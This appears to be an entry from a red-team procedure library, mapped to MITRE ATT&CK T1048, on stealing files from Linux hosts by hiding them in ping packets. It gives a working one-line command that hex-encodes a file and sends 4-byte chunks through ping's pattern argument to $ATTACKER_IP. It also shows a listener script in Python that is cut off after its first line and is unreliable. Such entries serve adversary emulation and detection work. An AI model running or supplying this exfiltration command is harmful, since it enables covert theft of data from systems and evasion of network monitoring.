---
id: e705ca44-1703-4167-8473-002c0e6c4163
name: Exfiltrate Data Using Ping
type: procedure
verified: true
submitted: true
created_at: '2019-10-18T22:31:55.554401+00:00'
updated_at: '2023-05-26T00:53:56.390704+00:00'
tactics:
- '[[Exfiltration|TA0010 - Exfiltration]]'
techniques:
- '[[Exfiltration Over Alternative Protocol|T1048 - Exfiltration Over Alternative
  Protocol]]'
platforms:
- Linux
tags:
- '[[Exfiltration]]'
- '[[Network]]'
commands:
- '[[Ping Exfiltrate Files with the Pattern Argument]]'
---

# Exfiltrate Data Using Ping

**Status**: ✓ Verified

## Summary

The Ping command can be used to exfiltrate data using the pattern argument, as long as the data is broken up into 16 byte chunks (4 characters). 

## Description

# Description

The Ping command can be used to exfiltrate data using the pattern argument, as long as the data is broken up into 16 byte chunks (4 characters).

# Instructions

1. Create a Python3 script which listens for ICMP packets and prints the results

**Code**: [[#!/usr/bin/env python3
from scapy.all import *
imp]]

2. Execute ping on the target system, specifying the file to copy

**Command** ([[Ping Exfiltrate Files with the Pattern Argument]]):

```bash
xxd -p -c 4 $FILENAME | while read line; do ping -c 1 -p $line $ATTACKER_IP; done
```

## Platforms

- Linux

## MITRE ATT&CK Mapping

### Tactics

- [[Exfiltration|TA0010 - Exfiltration]]

### Techniques

- [[Exfiltration Over Alternative Protocol|T1048 - Exfiltration Over Alternative Protocol]]

## Commands Used

- [[Ping Exfiltrate Files with the Pattern Argument]]

## Tags

- [[Exfiltration]]
- [[Network]]
